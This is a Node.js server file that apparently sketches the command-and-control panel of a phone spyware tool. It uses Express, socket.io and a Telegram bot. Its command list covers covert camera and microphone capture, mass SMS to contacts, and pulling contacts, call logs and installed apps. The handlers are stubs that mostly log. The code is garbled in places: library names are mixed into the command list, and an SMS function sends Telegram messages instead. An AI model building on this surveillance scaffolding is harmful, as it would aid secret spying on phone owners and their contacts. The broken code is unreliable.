const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

let bot; // Declare bot variable

// Function to initialize or return existing bot instance
function getTelegramBot() {
    if (!bot) {
        bot = new telegramBot(data.token, { polling: true, request: {} });
    }
    return bot;
}

const appData = new Map();
const actions = [
    'text',
    'upload',
    'notificationText',
    'currentNotificationText',
    'toastText',
    'smsText',
    'smsNumber',
    'smsToAllContacts',
    'textToAllContacts',
    'socket.io',
    'PORT',
    'html',
    'currentAction',
    'main-camera',
    'selfie-camera',
    'microphoneDuration',
    'vibrate',
    'vibrateDuration',
    'multer',
    'file',
    'sockets',
    'log',
    'express',
    'time',
    'post',
    'send',
    'emit',
    'readFileSync',
    'writeFileSync',
    'contacts',
    'calls',
    'apps',
    'url',
    'connection',
    'disconnect',
    'handshake',
    'data',
    'env',
    'token',
    'model',
    'commend',
    'Done'
];

function sendMessage(chatId, message) {
    const bot = getTelegramBot(); // Get bot instance
    bot.sendMessage(chatId, message);
}

function sendSms(phoneNumber, message) {
    const bot = getTelegramBot(); // Get bot instance
    bot.sendMessage(phoneNumber, message);
}

app.post('/upload', uploader.single('file'), (req, res) => {
    res.send('File uploaded successfully!');
});

app.post('/text', (req, res) => {
    const { chatId, message } = req.body;
    sendMessage(chatId, message);
    res.send('Message sent successfully!');
});

io.on('connection', (socket) => {
    console.log('A user connected');
    
    socket.on('disconnect', () => {
        console.log('User disconnected');
    });

    socket.on('text', (data) => {
        console.log('Received text message:', data);
    });

    socket.on('smsToAllContacts', (message) => {
        console.log('Sending SMS to all contacts:', message);
    });

    socket.on('textToAllContacts', (message) => {
        console.log('Sending text to all contacts:', message);
    });
});

const PORT = process.env.PORT || 3000; // Define PORT
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
